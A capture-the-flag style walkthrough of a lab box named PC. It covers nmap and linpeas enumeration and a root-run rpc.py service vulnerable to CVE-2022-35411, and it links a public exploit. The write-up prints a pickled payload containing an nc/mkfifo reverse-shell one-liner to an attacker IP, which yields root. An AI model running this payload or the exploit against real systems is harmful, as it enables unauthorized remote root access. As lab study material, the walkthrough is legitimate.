##### Tags: `CVE-2022-35411`  `rpc.py`  `github`  `unusual file`

# 🐧PC🐧
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.148.210
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-10 21:58 AEDT

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http    ttyd 1.7.3-a2312cb (libwebsockets 3.2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
port 8000 is a terminal of user
```console
user@pc:/home/user$ id
uid=1000(user) gid=1000(user) groups=1000(user)
```
run linpeas on user and found there is a unusual file call rpc.py in /opt
```console

╔══════════╣ Unexpected in /opt (usually empty)
total 16                                                                                                          
drwxr-xr-x  3 root root 4096 Aug 25  2023 .
drwxr-xr-x 19 root root 4096 Jun 15  2022 ..
drwx--x--x  4 root root 4096 Jun 28  2023 containerd
-rw-r--r--  1 root root  625 Aug 25  2023 rpc.py
```
and there is port 65432 running locally
```console
╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports                      
══╣ Active Ports (netstat)                                                                                        
tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      1045/ttyd                         
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:65432         0.0.0.0:*               LISTEN      -
```
the file is a script of port 65432 running by root  
so if we can get the RCE of it we can get the root shell
```console
user@pc:/opt$ cat rpc.py
from typing import AsyncGenerator
from typing_extensions import TypedDict

import uvicorn
from rpcpy import RPC

app = RPC(mode="ASGI")


@app.register
async def none() -> None:
    return


@app.register
async def sayhi(name: str) -> str:
    return f"hi {name}"


@app.register
async def yield_data(max_num: int) -> AsyncGenerator[int, None]:
    for i in range(max_num):
        yield i


D = TypedDict("D", {"key": str, "other-key": str})


@app.register
async def query_dict(value: str) -> D:
    return {"key": value, "other-key": value}


if __name__ == "__main__":
    uvicorn.run(app, interface="asgi3", port=65432)
```
search online and it is CVE-2022-35411 and found the RCE script of it  
https://github.com/fuzzlove/CVE-2022-35411/blob/main/rpc-exploit.py  
edit the reverse shell payload and upload the script to the machine and run it
```console
user@pc:/home/user$ python3 rpcpy-exploit.py
python3 rpcpy-exploit.py
b'\x80\x04\x95j\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8cOrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.166 22 >/tmp/f\x94\x85\x94R\x94.'

$ nc -lvnp 22                
listening on [any] 22 ...
connect to [192.168.45.166] from (UNKNOWN) [192.168.148.210] 44378

# id
uid=0(root) gid=0(root) groups=0(root)
```
